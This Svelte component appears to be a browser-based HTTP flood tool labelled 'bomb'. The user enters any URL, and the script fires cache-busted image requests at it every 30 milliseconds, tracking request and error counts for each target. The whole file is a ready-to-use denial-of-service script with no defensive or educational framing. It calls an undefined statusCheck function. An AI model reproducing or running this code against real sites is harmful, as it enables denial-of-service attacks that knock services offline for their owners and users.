<script>
	let target = ''
	let targets = {};
	const intervals = {};

	const bomb = (bombTarget) => {
		const rand = Math.floor(Math.random() * 1000);
		const url = `${bombTarget}/index.html?${rand}=value`;
		const image = new Image();
		
		image.onerror = (e) => {
			console.log(e);

			if (!targets[bombTarget]) {
				return;
			}

			targets[bombTarget].errors += 1;
		}
		
		image.src = url;
		targets[bombTarget].requested += 1;

		statusCheck(url);
	}

	
	const startBomb = () => {
		if (!target) {
			alert('Enter a target!');
			target = '';
			return;
		}
		
		if (!/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._\+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_\+.~#?&//=]*)/.test(target)) {
			alert('Not valid URL!')
			target = '';
			return			
		}
		
		if (targets[target]) {
			alert('You have added this target already!')
			target = '';
			return;
		}
		
		targets[target] = {}
		targets[target]['errors'] = 0;
		targets[target]['status'] = 0;
		targets[target]['requested'] = 0;
		
		intervals[target] = setInterval(bomb.bind(null, target), 30)
	}

	const stopBomb = (target) => {
		clearInterval(intervals[target]);
		const temp = {};

		for (let key in targets) {
			if (key !== target) {
				temp[key] = targets[key];
			}
		}

		targets = {...temp};
	}

	const stopAllBomb = () => {
		for (let target in intervals) {
			clearInterval(intervals[target]);
		}

		targets = {};
	}
</script>

<input type="text" bind:value={target} />
<button on:click={startBomb}>
	Start bomb
</button>
<button on:click={stopAllBomb}>Stop all Bombs</button>
<h1>
	Current target: {target}
</h1>

<div class="results">
	<div class="result header">
		<div>Target URL</div>
		<div>Requested</div>
		<div>Errors</div>
		<div>Status</div>
		<div>Action</div>
	</div>
	{#each Object.entries(targets) as [name, value]}
		<div class="result">
			<div>
				{name}
			</div>
			<div>{value.requested}</div>
			<div>{value.errors}</div>
			<div>{value.status}</div>
			<div><button on:click={() => stopBomb(name)}>Stop</button></div>
		</div>
	{/each}
</div>

<style>
	.results {
		display: flex;
		flex-direction: column;
		align-items: center;
		width: 100%;
	}
	.result {
		display: flex;
		width: 100%;
		height: 50px;
		align-items: center;
		justify-content: space-around;
	}

	.result div {
		width: 150px;
	}

	.header {
		font-weight: 800;
	}
</style>